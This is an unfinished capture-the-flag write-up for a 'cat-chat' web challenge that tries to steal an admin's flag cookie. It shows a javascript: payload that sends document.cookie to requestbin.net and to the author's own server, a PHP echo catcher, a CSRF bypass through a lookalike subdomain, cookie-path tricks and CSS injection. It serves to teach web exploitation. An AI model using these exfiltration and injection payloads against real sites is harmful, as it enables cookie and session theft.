# Goal
Get the Flag value of the admin sent via the /secret command

# Command Analysis

`/name $(value)` sets value of $(name). Note that you can set yourself as admin by `/name admin`.

`/report $(name)` leads to `/ban $(name)` , i.e. admin goes to your site when you report the person.

`/secret $(value)` sets the value of the `flag` cookie. There's no filter or sanitization so any character will be accepted.

# Steps

### 1. Payload in $(name)

$(name) is controllable. But it can't be so simple, can it?       
Let's try `/report javascript:location.href="//requestbin.net/xxx"+document.cookie`:

<csrf check fail img>

Doh! There's a CSRF header check. Let's try to bypass that.

### 2. CSRF

We can bypass the CSRF header check which only checks the start of the http location `cat-chat.web.ctfcompetition.com` like this:      
`cat-chat.web.ctfcompetition.com.example.com`     
Creating a subdomain on my server, we can do `cat-chat.web.ctfcompetition.com.ylkoh.top` to see the requests being sent to our server.  
We'll also host a PHP file on it to echo the request:    
```
<?php
  echo $_GET[c];
?>
```
Sending the same request above `/report javascript:location.href="//ylkoh.top/x.php"+document.cookie`: 

Alas! We did not get any useful information in the request.
Well that was kinda expected.

### 3. Concatenate multiple commands

One things I noticed from the server regex was that it took the request as long as it starts with `/xxx`.     
So, how about if we concatenate commands?

Let's try `/report /secret abc`, which leads to `/ban /secret abc` as seen earlier.

Using this payload: `/send?name=red_racoon&msg=/name/secret abc`, we get the following response:

<response image>

### 4. Setting a path to /secret

Since the `/secret` command sets a cookie with the `PATH= /`, we can try setting the path by sending it as a part of the request.    
`send?name=brown_bombay&msg=%2Fsecret+hey;+Path=/lol_thats_funny`

Which sets the following cookie:
`Set-Cookie: flag=hey; Path=/lol_thats_funny; Path=/; Max-Age=31536000`

### 5. CSS Injection

Looking through the catchat.js code again, there's actually a CSS Injection.      
`/name a]{;}body{background:red;}span[data-name^=
/report`

Which leads to this message appearing for other users:    
```display(`${esc(data.name)} was banned.<style>span[data-name^=${esc(data.name)}] { color: red; }</style>`);```

Generating this style in the CSS:      
```<style>span[data-name^=a]{;}body{background:red;}span[data-name^=a] { color: red; }</style>```

Not sure if it's useful but we could possibly bypass any CSP headers (there aren't any) with that.    
However, we can also bypass CSRF Headers with this method, using `background: url(http://domain/send?msg=abcd)`

# Summary

What do we know so far? 
* We must redirect the admin to our domain, so we need a CSRF Bypass
* Available commands are `/name /ban /secret /report`
* `/report` triggers a captcha so we cannot use that
* `/ban` allows any user to be banned, including the admin
* `/name` allows us to rename the admin

`flag=test; path=/some_weird_path` will trigger the relevant JS ``secret(data) { display(`Successfully changed secret to <span data-secret="${esc(cookie('flag'))}">*****</span>`); },``, showing the flag's path.

Cookie will take the path a `/`, not `/some_weird_path`. So we can set a cookie with a long value and it will ignore the second path.

